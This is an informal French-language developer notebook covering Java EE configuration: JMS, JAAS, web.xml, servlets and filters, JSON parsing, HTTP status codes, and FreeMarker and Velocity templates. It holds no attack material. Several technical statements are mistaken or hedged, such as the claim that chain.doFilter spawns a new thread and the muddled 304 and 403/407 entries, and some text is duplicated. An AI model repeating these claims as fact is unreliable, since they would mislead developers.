                                      <attribute name="JNDIName">sfd/jms/CLIPEmit</attribute>
                                      <depends optional-attribute-name="RARName">jboss.jca:service=RARDeployment,name='wmq.jmsra.rar'</depends>
                                      <attribute name="Type">javax.jms.Queue</attribute>
                                      <attribute name="Properties">
                                              baseQueueManagerName=FRROSFD1
                                              baseQueueName=UDA2AUDB
                              </attribute>
                              </mbean>
                              </connection-factories>


i18n :
culture = country_LANGUAGE
    * Text translation (interface, assets, and content) : utilisation de fichier dictionnaire (*.xml... ApplicationResources.properties)
    * Standards and formats (dates, amounts, numbers, and so on) (en base tout est standard. A l'affichage il faut faire la traduction pour le user et recuperer ce qu'il saisi dans sa langue pour l'enregistrer en standard en base)
    * Localized content (many versions of a given object according to a country) (il faut adapter la base: voir dessin ci dessous)
    mesProduits mesProduitsI18N
    -id         -id
    -prix       -culture
                -description


saj :     
  pour recuperer la session d'une classe action maintenant en version 2.0.0:
            On herite de SomDispatchAction et on fait ThreadContext.getSession()
   Si Il y a message impossible de trouver SIA.confpath
    parametrer en double cliquant sur le serveur et rajouter ca: au niveau de serveur VM arguments: (mettre les -D avant le -jar)
      -DSYE.confpath=D:\workspaceCESVN21\syeConf\conf -Darca.configuration=D:\workspaceCESVN21\syeConf\conf\arca-config.xml 
      pour r08 c'est : (mettre les -D avant le -jar) 
      -Darca.configuration=D:\workspaceCESVN21\r08Conf\conf\conf\arca-config.xml
JSON :
Attention au sein de json tout est en UTF8 parse accepte que utf8(jecrois) et stringify envoie des charactères caractères en utf8
super site pour convertir editer visualiser voir du json array en objet object conversion 
    https://jsoneditoronline.org/
tester testeur de variable json :
  http://jsonformatter.curiousconcept.com/
      un objet :
            {"libelleValeur1DeMonObjet":valeur1DeMonObjet, "libelleValeur2DeMonObjet":valeur2DeMonObjet, "libelleValeur3DeMonObjet":valeur3DeMonObjet}
      un tableau: 
          [valeur1, valeur2...]
      un tableau non indexe :(avec pour index du texte au lieu de chiffres)
       je ne sais pas
pour recuperer un string et le parser en objet javascript:
        <javascript>
          var test = "[\"Aaaaaaa\",\"D D\",\"First Contact Last Name Contact, Lolo \"]";
          var people = JSON.parse(test);
        </javascript>
        <java>
        on a plusieurs parseur JSON: 
        JSONObject, JSONArray, JSONSTring etc etc...
                JSONObject jso = new JSONObject("{\"SOLUTION_APPLICATION_DATE\":\"null\",\"LUA_UPDATE_DATE\":\"2010-10-09 11:31:50.0\",\"LUP_QUESTION_ID\":\"null\",\"IC_ANS_LAST_MODIF\":\"null\",\"VEH_PLANT\":\"FLINS\",\"FUNC_WORDING\":\"null\",\"GBOX_PLANT\":\"SEVILLE\",\"L2INCIDENT_WORDING\":\"null\",\"FIRST_DETECTION_DATE\":\"2010-10-09 09:27:04.0\",\"ASS_ALERT_SOL_DATE\":\"null\",\"ENG_AXIS\":\"null\",\"MAIN_NITG\":\"null\",\"PRODUCTION_DATE\":\"2007-08-01 00:00:00.0\",\"ENG_SUBCLASS\":\"null\",\"ENG_PLANT\":\"VALLADOLID\",\"RNUM\":\"1\",\"VEHICLE_PROJECT\":\"null\",\"WITHOUT_LUP\":\"null\",\"CS_WORDING\":\"null\",\"UPDATED_CASE_NUMBER\":\"null\",\"ORIGIN\":\"ACTIS\",\"STATUS_WORDING\":\"To Document\",\"WOR_ALGORITHM_NAME\":\"FIC Keyword\",\"TRIGGER_INC_DATE\":\"2010-01-11 00:00:00.0\",\"GBX_TYPE\":\"TL4\",\"ECR\":\"0575\",\"MAIN_DELIVERY_CTRY\":\"DE\",\"ALREADY_DETECTED\":\"1\",\"ECR2_WORDING\":\"Engine: High fuel consumption\",\"STATUS\":\"3\",\"COST_BY_VEH\":\"0\",\"METH_NAME\":\"Test FIC Keyword\",\"RC_CODE\":\"null\",\"MIS\":\"null\",\"INCIDENTOLOG_COM\":\"null\",\"CASE_NUMBER\":\"1\",\"RC_WORDING\":\"null\",\"KEY_MESH\":\"null\",\"PROJECT_CODE\":\"null\",\"FLEET_NAME\":\"null\",\"TO_DATE(T_ALG_ALERT.PRODUCTION_QUARTER,DD/MM/YYYY)\":\"2007-07-01 00:00:00.0\",\"SUB_FUNC_WORDING\":\"null\",\"ALGORITHM_ID\":\"9\",\"STATUS_CODE\":\"D\",\"MAILING_DATE\":\"2010-10-09 11:31:50.0\",\"PRIORITY\":\"1\",\"NITG_WORDING\":\"null\",\"INITIAL_CASE_NUMBER\":\"1\",\"SYMPTOM_CODE\":\"null\",\"ID_ALERT_LUA\":\"null\",\"GBX_AXIS\":\"null\",\"ALERT_ID\":\"A000000033\",\"DTC_WORDING\":\"null\",\"UCR_WORDING\":\"null\",\"GBX_SUBCLASS\":\"null\",\"TYPE_ID\":\"5\",\"ENG_TYPE\":\"K9K\",\"DETECTED_CODE\":\"No\"}");
                ou bien 
                return new JSONObject(new JSONTokener("{\"ZY05\":[\"N05TRI\",\"NOMPAT\"],\"ZY06\":[\"PRENOM\"],\"ZY07\":[\"N07TRI\",\"N07NOMUSE\"],\"ZY0F\":[\"ZONADB\",\"ZONADC\"],\"ZY10\":[\"VILNAI\"],\"ZY3\":[\"BLBEMPL\",\"NMPRES\"]}"));
                ou bien 
                
            	JSONArray jsonArray = new JSONArray();
              jsonArray.put(jso);
       				return jsonArray;
        </java>          
pour parcourir un tableau json:
        <javascript> 
       for(var kj in people) // people c mon tableau json
        {
        	var value = kj;
        	var label = people[kj];
        }
        </javascript>
pour faire l'inverse: convertir un objet json en string: 
        var myJSONText = JSON.stringify(myObject, replacer, ); // replacer et space sont facultatifs
pour transformer un bean en json et vice et versa: 
        Gson gson = new Gson(); // Or use new GsonBuilder().create();
         MyType target = new MyType();
         String json = gson.toJson(target); // serializes target to Json
         MyType target2 = gson.fromJson(json, MyType.class); // deserializes json into target2

              
firefox: / ie : explorer : 
      attention par rapport à IE il reecrit les liens en rajoutant devant : http://localhost etc etc...

netbean: 
    rename de variable: 
        placer curseur sur variable puis control + r

vbs: visualbasic :
pour connaitre sa version creer un fichier test.vbs et ecrire dedans 
								dim msg
								msg = "La version de WSH est : " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
								wscript.Echo msg

								puis executer ce fichier

http : un flux http c juste  un string qui passe par une socket. ce string contient : (unclebob)LINKrequ939302
    pour la requete : GET /fichier.html HTTP/1.1\nHost: www.monsite.com\n User-Agent: nomDeMonNavigateur\nWWW-Authenticate:unTicketKerberosParExemple\nNomChamp:valeur (etc...FINENTETE.siPost, possible: DEBUTBODY:)xxxxxx
          champs d'entete:
              referer: url et page contenant le lien sur lequel l'utilisateur a cliqué
    pour la reponse :  HTTP/1.1 200 OK\nDate: Thu, 24 Sept 2009 19:00:00GMT\nServer:xxx\nContent-Length:xxx\nContent-Type:text/html;charset=UTF-8\n\n(FINENETE. corp reponse:)<html>blablabla</html>
    champs d'entete:
        set-cookie: valeurs renvoyées du serveur vers le navigateur. Ce dernier les renverra ensuite dans ses requetes dans "Cookie"
        location: si redirection, indique l'url cible  
        WWW-Authenticate: Negociate // si la requête contenait WWW-Authenticate et que l'utilisateur n'a pas de session. Dans ce cas le code HTTP est 401                                                              
erreurs codes http: LINKcodesHttp
200: OK
201: Confirmation que creation OK. Lien vers l'objet crée figure dans le header "Location"
202: Confirmation que changement accepté mais pas encore terminé. Lien vers l'objet qui sera crée/modifié figure dans le header "Location"
204: OK mais je reste sur la meme page
301: redirection permanante et definitive
302: redirection temporaire. Google n'aimepas
400: erreur de synthaxe:protocole http non respecte
401: non authorise (manque login/password): n'a pas encore été authentifé et le navigateur doit maintenant chercher à s'authentifier. Contient dans le header WWW-Authenticate
403 407: interdit (login/password incorrect) authentification a échoué
404: page non trouvee
405: methode http inadaptee: enlever de ma servlet super.doPost(req, resp); pour que ça marche.
408: timeout
413 Payload Too Large
304: le serveur dit que le browser a deja toutes les infos et pas besoin de renvoyer d'autres infos + code 200
500: erreur interne du serveur
503: Service unavailable
502: Probleme entre un serveur proxy intermediaire et le serveur final: probleme de protocole ou config


J2EE :


JAAS :
    javax.security.auth.login.LoginContext(nomDuLoginModuleAUtiliser,callbackhanderUserInteragitAvecPourS'authentifier. Se retrouve dans classe LoginModule)
          reference un javax.security.auth.login.Configuration 
                                      Configuration localConfiguration = Configuration.getConfiguration();
AppConfigurationEntry localAppConfigurationEntry = localConfiguration.getAppConfigurationEntry(nomDuLoginModuleAUtiliser)    cette conf est recuperable par System.getProperty("java.security.auth.login.config")   le fichier de ce path s'appelle en general "jaas.conf" et contient :        
       Map localMap = localAppConfigurationEntry.getOptions();         |      si pas de loginmodule trouvé renvoit:LoginException                                                                                |
                                                                       |                        |                                                                                                                |
                                                                       |             Sont Specifiques au container(tomcat,jboss,karaf etc...)                                                                    |
                                                                       |                                                                                                                                         |
                              qdJeFais LoginContext.login()ca fait     |                                                                                                                                         |
          <-------------------LoginModule authentifieGraceAuCredential-- Un realm contient 1 ou plusieurs loginModule                                                                                            V Ca c'est le format standard. Mais selon qu'on est sur Karaf, jboss websphere etc etc... la déclaration du loginmodule se fait differemment: karaf:dans bundle.xml, jboss dans fichier xml etc...
                             public boolean login(user/password)                                                                                                                                                nomDuLoginModuleAUtiliser {
                                             {                                                                                                                                                                    com.sun.security.auth.module.Krb5LoginModule required
                                             sonCallbackHandler.handle(Callback[]); // on lui envoie une liste de questions à poser à l'utilisateur                                                                                                  parametre1=valeur1
                                              ((xxx)Callback[i]).credentialsaisi                                                                                                                                  parametre2=valeur2; //finir par";" ces parametres seront envoyés dans methode "initialize" du LoginModule :-)
                                              si ok return true;                                                                                                                                                };
                                             }                                                                                                                                                                    
                           Principal<-Subject.getPrincipals()                                                                                                                                                                                        
                                                                                                                                                                                                                  
                                                                                                                                                                                                                
web.xml : webxml :
            icon Le chemin d'accès a une icône qui peut être employee par un outil graphique pour representer l'application Web. 
            display-name Un nom qui peut être employe par un outil de gestion d'applications pour representer l'application Web. 
            description Une description de l'application. 
            distributable Indique si l'application peut être distribuee entre plusieurs serveurs. La valeur par defaut est false.  
            context-param Contient les valeurs des paramètres valables pour toute l'application Web. 
                 <context-param>
                    <param-name>tata</param-name>
                    <param-value>${com.hraccess.portal.dir.conf}</param-value> //va chercher com.hraccess.portal.dir.conf dans les java system.properties (-Dxxxx=yyy par ex) LINKparamSystem
                    ou 
                    <param-value>blah</param-value>
                </context-param>
                        est recuperable en java dans une classe implementant javax.servlet.ServletContextListener par : 
                              ServletContext app = servletContextEvent.getServletContext(); ou par request.getSession(false ou true).getServletContext() 
                              ou par HttpServletRequest servletRequest = (HttpServletRequest) request; servletRequest.getSession(false ou true).getServletContext()
                              String uneVariable= app.getInitParameter("tata");
                        est recuperable en java dans une Servlet par :
                              public class MaServlet extends HttpServlet{
                                     public void init(ServletConfig config) throws ServletException
                                     { 
                                            servletContext = config.getServletContext();
                                            this.tgcCache = ((UnObjet)servletContext .getAttribute("tata"));
                                             
            filter Definit une classe de filtre qui sera aplliquee avant la servlet. (voir http://manu.e3b.org/Java/Tutoriels/J2EE/Descripteur.htm ou http://74.125.39.104/search?q=cache:_3YFpOityV4J:manu.e3b.org/Java/Tutoriels/J2EE/Descripteur.htm+description+web.xml+descripteur+de+deploiement+%3Cfilter%3E&hl=fr&ct=clnk&cd=1&gl=fr)
            			exemple: 
            			<filter>
            		<filter-name>SessionCountFilter</filter-name>
            		<filter-class>renault.rad.util.filter.SessionCountFilter</filter-class>
            		<init-param> LINKFiltrelksjdf
            		 <param-name>excludedPath</param-name> // variable(attribut) de la classe SessionCountFilter voir ci dessous methode init() du filtre
            		 <param-value>sys;security</param-value> // settee avec cette valeur. Possible utiliser LINKparamSystem
            		</init-param>
            	</filter>
            filter-mapping Definit un alias pour un filtre.  // c'est important sinon le filtre ne passe pas. : ordre est important : du haut vers le bas
            						<filter-mapping>	
            							<filter-name>LockI18NManager</filter-name>	
            							<url-pattern>*.do</url-pattern> il est appelle a chaque fois qu'on appelle un .do mais je peux aussi mettre *.jsp
            						</filter-mapping>
            				exemple de classe filter:
            				import javax.servlet.Filter;
            						public class SessionExistFilter implements Filter {
            						private FilterConfig filterConfig=null;
            						public void destroy() 
            						{
            						// TODO Raccord de methode auto-genere
            						}
            						public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException 
            						{
            						      filterConfig.getInitParameter("cle du parametre init").indexOf("toto)>-1 // recupertion du parametre init-parameter LINKFiltrelksjdf
            									HttpServletRequest req = (HttpServletRequest)request;
            									if (req.getSession(false)==null) throw new ServletException("timeout");// attention recree une  nouvelle session si on met true dans la methode.
            									chain.doFilter(request,response); // attention il ouvre un autre thread et continue le code si il y en a a la suite (sauf je crois si on met juste en dessous return;)
            						}
            							public void init(FilterConfig arg0) throws ServletException 
            						{
            								this.filterConfig=arg0; // recuperation du parametre init-parameter
            						}
            listener Definit une classe de listener qui sera appelee par le conteneur à la survenue d'un evenement particulier.
                <listener>
                  <listener-class>un.package.UneClasseQuiImplementeServletContextListenerEtLaMethodeContextInitialize</listener-class> // on peut getter-setter dans le ServletContext comme on veut
                </listener> // on peut mettre plusieurs <listener> les uns a la suite des autres
                        ServletContext app = servletContextEvent.getServletContext();
                        String uneVariable= app.getInitParameter("toto"); // c'est la valeur d'un context-param
                        et
                        app.setAttribute("tgcCache", tgcCache);// est recuperable dans une servlet par servletConfig.getServletContext().getAttribute("tgcCache"));
                  
            servlet Definit une servlet par son nom et sa classe.
                        <servlet>
                        		<servlet-name>RadiusAuthenticationServlet</servlet-name>
                        		<servlet-class>com.hraccess.bnpp.sso.RadiusAuthenticationServlet</servlet-class>
                        	    <init-param>
                        	        <param-name>blblibli</param-name>
                        	        <param-value>blablabla</param-value> blablabla est recupere par public class MaServlet extends HttpServlet {public void init(ServletConfig config){ config.getInitParameter("blblibli"); possible utiliser LINKparamSystem
                        	    </init-param>  
            servlet-mapping Definit un alias pour une servlet.
            session-config Definit un delai maximal d'inactivite pour les sessions.  
            		    sous <web-app>:<session-config>
                	<session-timeout>15</session-timeout>
                </session-config>
            mime-mapping Definit une association entre les fichiers publics de l'application et des types MIME.  
            welcome-file-list Definit la ressource à retourner par defaut au client si aucune ressource n'est specifiee.  
            error-page Definit la page d'erreur à retourner si aucune erreur particulière se produit.  
            taglib Definit l'emplacement des bibliothèques de balises.  
            resource-env-ref Configure une ressource externe qui peut être utilisee par la servlet.
                    <resource-env-ref id="grantConfigJndiUrlResource">
                      <resource-env-ref-name>url/GrantApiJEESS3</resource-env-ref-name>
                      <resource-env-ref-type>java.net.URL</resource-env-ref-type>
                    </resource-env-ref>
                      et dans Tomcat/.../context.xml j'ai: voir context.xml tomcat LINK39210
                               //du coup dans spring je peux utiliser cette resource jndi comme ça :
                               <!-- Court avec le namespace jee: -->
                                    <jee:jndi-lookup id="galleryDatasource" jndi-name="java:comp/env/jdbc/gallery"/>
                                    ou bien 
                                      <bean id="grantConfig" class="org.springframework.core.io.UrlResource">
                                          <constructor-arg ref="grantConfigJndiUrlResource"/>
                                        </bean>
                                      <bean id="grantConfigJndiUrlResource" class="org.springframework.jndi.JndiObjectFactoryBean">
                                          <property name="jndiName"><value>java:comp/env/url/GrantApiJEESS3</value></property>
                                      </bean>
                                    ou bien 
                                    <bean id="galleryDatasource" class="org.springframework.jndi.JndiObjectFactoryBean">
                                          <property name="jndiName" value="java:comp/env/jdbc/gallery"/>
                                    </bean>
                                     
            resource-ref Configure une ressource externe qui peut être utilisee par la servlet. LINK##--~~##                          
                        <resource-ref>
                            <description>sqlite DataSource</description>
                            <res-ref-name>jdbc/sqliteDS</res-ref-name>
                            <res-type>javax.sql.DataSource</res-type>
                            <res-auth>Container</res-auth>
                        </resource-ref>
                   et dans TOMCAT/.../data-context.xml: voir data-context.xml et catalina/localhost/monapplication.xml voir LINK929293                                                                                  
     				<login-config> voir LINKp^g^g^g Configure la methode d'authentification. 
											<auth-method>FORM(ou BASIC si on veut une popup) ou SPNEGO</auth-method> alors dans jboss-web.xml on a  : <jboss-web><security-domain>java:/jaas/SPNEGO</security-domain></jboss-web>
											<realm-name>R@D realm</realm-name> nom du realm qui est défini dans le serveur applicatif...(?)... ou exactement: dans l'admin du serveur.... 
											<form-login-config>
												<form-login-page>/security/login.do</form-login-page>
												<form-error-page>/security/loginError.do</form-error-page>
											</form-login-config>
					</login-config>
					donc au chargement de la racine de l'appli on appelle l'action security/login. Or dans struts-config.xml on a ca :
								<action path="/security/login"
								type="org.apache.struts.actions.ForwardAction" parameter="tile.login" /> or struts dit que ce forward va vers ce qui as dans parameter
					donc il va direct vers le tile tile.login qui est la jsp /security/login.jsp et l'action de cette jsp post vers /j_security_check
					j_security_check est un alias websphere qui va utiliser les request cles j_username et j_password pour verifier l'authentification automatiquement.
					Il redirige ensuite vers vers ce qu'il voit dans web.xml à cette endroit: 
					     <welcome-file-list>
					    	<welcome-file>index.html</welcome-file>
					    </welcome-file-list>
					or Index.html contient 
								<HTML><HEAD><META HTTP-EQUIV='Refresh' CONTENT='0;URL=index.jsp'></HEAD></HTML>
					index.jsp a un frameset qui dirige vers auth/home.do qui est une action struts. C'est la methode executeAction() de cette classe qui est appelee (or cette methode est definie dans la classe mere de la classe)  
            security-constraint Decrit les rôles des utilisateurs ou groupes d'utilisateurs pouvant acceder à l'application Web.  mapping entre security-role ci-dessous et des url-patterns			
            			<security-constraint>      //s'appuye sur <login-config> LINKp^g^g^g
                            <display-name>Security for Your Enterprise</display-name> // du blabla
                            <web-resource-collection> // je peux en mettre plusieurs. Chacun a un nom: ci dessous et une url ci dessous
                                			<web-resource-name>Your Enterprise web Security</web-resource-name> // le nom 
                                			<description>Redirect all to SSL</description>
                                			<url-pattern>/*</url-pattern> // l'url qui est sécurisée peut etre /maServlet
                                			<http-method>GET</http-method> // facultatif : si je ne mets pas c pour toutes types de requetes methode.
                                      <http-method>POST</http-method> // facultatif
                            </web-resource-collection>
                                		
                                    <user-data-constraint>
                                			<description>Protection should be CONFIDENTIAL</description>
                                			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
                                		</user-data-constraint>
                                		ou 
                                		 <auth-constraint>
                                	      <role-name>supervisor</role-name> // les roles définies et retournes par le realm qui ont le droit.  
                                	      <role-name>user</role-name>
                                	  </auth-constraint>
                          </security-constraint>
            <security-role> Definit un rôle de securite pour l'application: interne à l'appli.
                	      <role-name>user</role-name> // on retrouve les memes que ceux definis dans <auth-constraint>                 
                	      <role-name>supervisor</role-name>
            </security-role>
            env-entry Definit le nom d'une ressource accessible grâce à l'interface JNDI. voir LINK''''**''''  
             pages d'erreurs:
                      <error-page>
                        <exception-type>javax.faces.application.ViewExpiredException
                        </exception-type>
                        <location>/faces/sessionExpired.xhtml</location>
                        ... Mais si on ne met pas ca, pas grave car par defaut page d'erreur est top            
                       
                        
            						return envCtx.lookup("java:comp/env/" + name); (ou name = APP_I18N_CONF)
            							} catch (NamingException e)
            ejb-ref Definit une reference distante à un Entreprise JavaBean (EJB).  
            ejb-local-ref Definit une reference locale à un EJB.  


pour recuperer de manière sympa les parametres renvoyes par une page web:
				protected String getStringParameter(String name){
							return (String)getParameter(name, String.class);	
						}
						
						protected Integer getIntegerParameter(String name){
							return (Integer) getParameter(name, Integer.class);
						}
				appellent:
				protected Object getParameter(String name, Class typeRetour){
							try {
								String value = request.getParameter(name);
								Constructor constructeur = typeRetour.getConstructor(new Class[]{String.class});
								return constructeur.newInstance(new Object[]{value});
							} catch (Exception e) {
								return null;
							}
						}
Pour afficher du html en sortie de servlet ou du texte en sortie de servlet ou n'importe quoi d'autre
freemaker :
      <html>
          <head>
            <title>Welcome!</title>
          </head>
          <body> <#-- commentaire -->
            <h1>Welcome ${user}!</h1>
            <p>Our latest product: <#if user == "Big Joe">, our beloved leader</#if> // condition (avec # au lieu de $)
            <a href="${latestProduct.url}">${latestProduct.name}</a>!
            <#list misc.fruits>          // faire une liste iteration iterate
                <ul>
                  <#items as fruit> // comme ca si ya pas de fruit alors <li> ne s'affiche pas
                    <li>${fruit?upper_case ou ?cap_first ou ... facultatif}
                  </#items>
                </ul>
              </#list>
              <#include "/copyright_footer.html"> // inclue un autre fichier
          </body>
          </html>
          // la configuration doit etre un singleton unique pour toute l'application
                                    // Create your Configuration instance, and specify if up to what FreeMarker
                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
                                    // backward-compatible. See the Confi// Create your Configuration instance, and specify if up to what FreeMarker
                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
                                    // backward-compatible. See the Configuration JavaDoc for details.
                                    Configuration cfg = new Configuration(Configuration.VERSION_2_3_27);
                                    
                                    // Specify the source where the template files come from. Here I set a
                                    // plain directory for it, but non-file-system sources are possible too:
                                    cfg.setDirectoryForTemplateLoading(new File("/where/you/store/templates"));
                                    
                                    // Set the preferred charset template files are stored in. UTF-8 is
                                    // a good choice in most applications:
                                    cfg.setDefaultEncoding("UTF-8");
                                    
                                    // Sets how errors will appear.
                                    // During web page *development* TemplateExceptionHandler.HTML_DEBUG_HANDLER is better.
                                    cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
                                    
                                    // Don't log exceptions inside FreeMarker that it will thrown at you anyway:
                                    cfg.setLogTemplateExceptions(false);
                                    
                                    // Wrap unchecked exceptions thrown during template processing into TemplateException-s.
                                    cfg.setWrapUncheckedExceptions(true);
          
          
          
  Avec Velocity : (voir freemaker c'est mieux.)
    dans un fichier toto.vm
    #set( $contextPath = $request.getContextPath() )
  <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
        <link rel="stylesheet" href="${contextPath}/bower_components/bootstrap/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="${contextPath}/bower_components/font-awesome/css/font-awesome.min.css"/>
        <link rel="stylesheet" href="${contextPath}/stylesheets/login.css">
    <body onload="document.forms[0].submit()">
        <noscript>
            <p>
                <strong>Note:</strong> Since your browser does not support JavaScript,
                you must press the Continue button once to proceed.
            </p>
        </noscript>
        <form action="${action}" method="post">
            <div>
                #if($RelayState)<input type="hidden" name="RelayState" value="${RelayState}"/>#end
                #if($SAMLRequest)<input type="hidden" name="SAMLRequest" value="${SAMLRequest}"/>#end
                #if($SAMLResponse)<input type="hidden" name="SAMLResponse" value="${SAMLResponse}"/>#end
            </div>
            <noscript>
                <div>
                    <input type="submit" value="Continue"/>
                </div>
            </noscript>
        (...)
      Dans le java utilisation de velocity:
          Utiliser un velocityEngine pour toute l'appli c mieux.: a l'initialisation faire:
                  velocityEngine = new VelocityEngine();
                  velocityEngine.setProperty(RuntimeConstants.ENCODING_DEFAULT, "UTF-8");
                  velocityEngine.setProperty(RuntimeConstants.OUTPUT_ENCODING, "UTF-8");
                  velocityEngine.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
                  velocityEngine.setProperty("classpath.resource.loader.class", "org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader");
                  velocityEngine.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM_CLASS, Log4JLogChute.class.getName());
                    try {
                        velocityEngine.init();
                    } catch (Exception e) {
                        logger.info("Erreur d'initialisation de velocity: " + e.getMessage());
                        logger.info(e.getLocalizedMessage());
                    }
          Puis pour utiliser :  
                  VelocityContext context = new VelocityContext();
                    context.put("request", request);
                    context.put("response", response);
                    context.put("action", endpointURL);
                    context.put("SAMLRequest", encodedMessage);
                    context.put("SAMLResponse", encodedMessage);
                    context.put("RelayState", relayState);
                    response.setContentType("text/html; charset=UTF-8");
                    response.setStatus(HttpServletResponse.SC_OK);
                    Template loginTemplate = velocityEngine.getTemplate("/path/vers/fichier/xxx.vm","ISO-8859-15");
                    loginTemplate.merge(context, response.getWriter());
                    ou
                    StringWriter buffer = new StringWriter();
                        this.velocityEngine.mergeTemplate("sso/loginpageexception.vm", "UTF-8", context, buffer);
                        buffer.flush();
                        return buffer.getBuffer().toString();
                ou bien 
                        HTTPOutTransport outTransport = (HTTPOutTransport)messageContext.getOutboundMessageTransport();
                        HTTPTransportUtils.addNoCacheHeaders(outTransport);
                        HTTPTransportUtils.setUTF8Encoding(outTransport);
                        HTTPTransportUtils.setContentType(outTransport, "text/html");
                        OutputStreamWriter out = new OutputStreamWriter(outTransport.getOutgoingStream(), "UTF-8");
                        this.velocityEngine.mergeTemplate("/path/vers/fichier/xxx.vm", "UTF-8", e, out);
                        out.flush();
                        ou
                        
        
            Avant: 
            import java.io.*;
            import javax.servlet.*;
            import javax.servlet.http.*;
                                            
            public class HelloWWW extends HttpServlet {
              public void doGet(HttpServletRequest request,
                                HttpServletResponse response)
                  throws ServletException, IOException {
                  si je voulais renvoyer vers une jsp ou une page je ferais :request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
                        ATTENTION! doit être la dernière chose executee : pas de chain après ou d'autre redirection de request requette! java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
                response.setContentType("text/html"); (ou application/txt etc etc...)
                PrintWriter out = response.getWriter();
                out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
                                                    "Transitional//EN\">\n" +
                            "<HTML>\n" +
                            "<HEAD><TITLE>Hello WWW</TITLE></HEAD>\n" +
                            "<BODY>\n" +
                            "<H1>Hello WWW</H1>\n" +
                            "</BODY></HTML>");
              }
            }

Pour afficher les elements d'un request: lister parametres
	out.println(request.getParameter("param1") + "\n");
ou
   Enumeration paramNames = request.getParameterNames();
   while(paramNames.hasMoreElements()) {
   String paramName = (String)paramNames.nextElement();
   System.out.println("<TR><TD>" + paramName + "\n<TD>");
ou 
  String[] paramValues = request.getParameterValues(paramName);
      etc etc...
ou si c'est dans le payload de la request
	       BufferedReader reader= req.getReader(); // si le payload est dans la request LINK564894 sinon si c'est des paramètres de request Utiliser plutot LINKee"(çà)" 
         StringBuilder result = new StringBuilder();
         String line;
         while ((line = reader.readLine()) != null) {
        	 System.out.println("pffff"+line); 
             result.append(line);
         }
         System.out.println("mon json : "+result.toString()); // result c'est le json. 
    ou voir LINKee"(çà)" si c'est multipart		 
(Il y a aussi: recuperer l'url du request 
request.getMethod() 
request.getRequestURI() // pour connaitre la page appelante. Exemple: /saml-landing
request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
request.getQueryString() // retourne l'url mais uniquement après "?"
request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
request.getProtocol() ... bof...)
************************
Si j'ai un problème d'accents encodage dans le REQUEST:(voir plutot la solution RESPONSE ci dessous) du formulaire jsp vers les actions:
		J'avais un dynaform ou dynavalidatorform qui prenait des parametres string et on y rentrait dans le formulaire des accents. En cas de non validation retour à l'input avec les accents complettement chelous.
		il faut utiliser le filtre org.apache.webapp.admin.filters.SetCharacterEncodingFilter qui se trouve dans la librairie catalina-admin-5.0.28.jar
		declarer ce filtre dans web.xml comme ca:
				<filter>
				<filter-name>SetCharacterEncodingFilter</filter-name>
				<filter-class>org.apache.webapp.admin.filters.SetCharacterEncodingFilter</filter-class>
				<init-param>
				 <param-name>encoding</param-name> 
				 <param-value>UTF-8</param-value> /// tout depend de ce qu'envoient les jsp: voir leur header. exemple: ca ca marche pour windows. Pour unix il semble qu'il faut mettre iso8859-1 (peut etre parce que dans les jsp selon l'environnement le header sera different: voir code des jsp)
				</init-param> (voir init-param des filtre plus bas)
			</filter>
			<filter-mapping>	
				<filter-name>SetCharacterEncodingFilter</filter-name>	
						<url-pattern>/*</url-pattern>
			</filter-mapping>
Si j'ai un problème d'accents dans le RESPONSE: des actions vers les jsp (affichage errone a l'ecran):
						ajouter dans la main.jsp: <%@ page contentType="text/html; charset=UTF-8" %>
						Dans web.xml:
					<filter>
				<filter-name>UtfResponseEncoderFilter</filter-name>
				<filter-class>renault.r08.filters.UtfResponseEncoderFilter</filter-class>
			</filter>
			<filter-mapping>	
				<filter-name>UtfResponseEncoderFilter</filter-name>	
						<url-pattern>/*</url-pattern>
			</filter-mapping>
				en Java:
							package renault.r08.filters;
							import java.io.IOException;
							import javax.servlet.Filter;
							import javax.servlet.FilterChain;
							import javax.servlet.FilterConfig;
							import javax.servlet.ServletException;
							import javax.servlet.ServletRequest;
							import javax.servlet.ServletResponse;
							public class UtfResponseEncoderFilter implements Filter {
								public void destroy() 
								{
								// TODO Raccord de methode auto-genere
								}
								public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException 
								{
										request.setCharacterEncoding("UTF-8");
										HttpServletResponse toto = (HttpServletResponse)response;
										toto.setHeader("Content-Type","text/html;charset=UTF-8");
										response.setContentType("text/html; charset=UTF-8");
									chain.doFilter(request,response); // attention il ouvre un autre thread et continue le code si il y en a a la suite (sauf je crois si on met juste en dessous return;)
									                                      mais il peut renvoyer une exception (genr auth exception) ici même.
								}
									public void init(FilterConfig arg0) throws ServletException 
								{
									(voir SessionTraceFilter qui est un bon exemple de filtre)
								}
							}
pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
	 String header = "attachement;filename="+fileName.substring(0,fileName.lastIndexOf("."));
				response.addHeader("content-disposition", header);
				response.setContentType("text");
		ServletOutputStream outstr = response.getOutputStream();
		FileInputStream lire = new FileInputStream(file);
